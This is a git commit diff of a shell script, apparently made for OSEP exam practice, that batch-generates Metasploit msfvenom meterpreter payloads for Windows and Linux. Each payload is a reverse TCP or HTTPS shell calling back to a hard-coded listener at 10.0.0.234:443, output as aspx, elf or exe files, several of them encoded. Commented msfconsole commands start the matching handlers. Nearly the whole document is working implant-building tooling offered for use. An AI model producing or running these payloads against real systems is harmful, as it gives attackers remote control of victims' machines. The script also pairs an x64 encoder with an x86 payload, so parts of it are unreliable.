d3513149b540f0ad2547e0d0ac1749c11e3c18db
god <god@kali.htb>
2025-03-29 09:14:50 -0400

    commit

--- quickly_generate_bin.sh
+++ quickly_generate_bin.sh
@@ -1,29 +1,37 @@
 #!/bin/sh
 
 # Quicky generate msfvenom bin for OSEP exam
-# author: shaoyongyang
+# author: 午後の紅茶
 # version: v1.0
 
-lHost=10.0.0.234
-lPort=443
-savePath=/opt/project/temp_bin/
+static_local_ip_address=10.0.0.234
+static_local_port=443
 
-echo $ipAddr
-echo $lPort
+savePath=./temp_bin/
+
+mkdir temp_bin
+
+echo "IP: " $static_local_ip_address
+echo "Port: "$static_local_port
 echo $savePath
 
 # generate bin
 
-## x64
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lHost LPORT=$lPort -e x64/zutto_dekiru -f aspx > $savePath/windows_x64_meterpreter_reverse_tcp.aspx
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lHost LPORT=$lPort prependfork=true -f elf > $savePath/linux_x64_meterpreter_reverse_tcp.elf
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lHost LPORT=$lPort -f exe -e x64/zutto_dekiru > $savePath/windows_x64_meterpreter_reverse_https.exe
+mkdir $savePath/x64
+mkdir $savePath/x86
 
+## x64
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -e x64/zutto_dekiru -f aspx > $savePath/x64/reverse_tcp.aspx
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port prependfork=true -f elf > $savePath/x64/reverse_tcp.elf
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f exe -e x64/zutto_dekiru > $savePath/x64/reverse_https.exe
+
+# sudo msfconsole -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport 443;run'
 
 ## x86
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lHost LPORT=$lPort -e x64/zutto_dekiru -f aspx > $savePath/windows_meterpreter_reverse_tcp.aspx
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lHost LPORT=$lPort prependfork=true -f elf > $savePath/linux_x86_meterpreter_reverse_tcp.elf
-msfvenom -p windows/meterpreter/reverse_https LHOST=$lHost LPORT=$lPort -f exe > $savePath/windows_meterpreter_reverse_https.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port -e x64/zutto_dekiru -f aspx > $savePath/x86/reverse_tcp.aspx
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$static_local_ip_address LPORT=$static_local_port prependfork=true -f elf > $savePath/x86/reverse_tcp.elf
+msfvenom -p windows/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f exe > $savePath/x86/reverse_https.exe
 
+# sudo msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set lhost 0.0.0.0;set lport 443;run'
 
 # generate html doc hta js
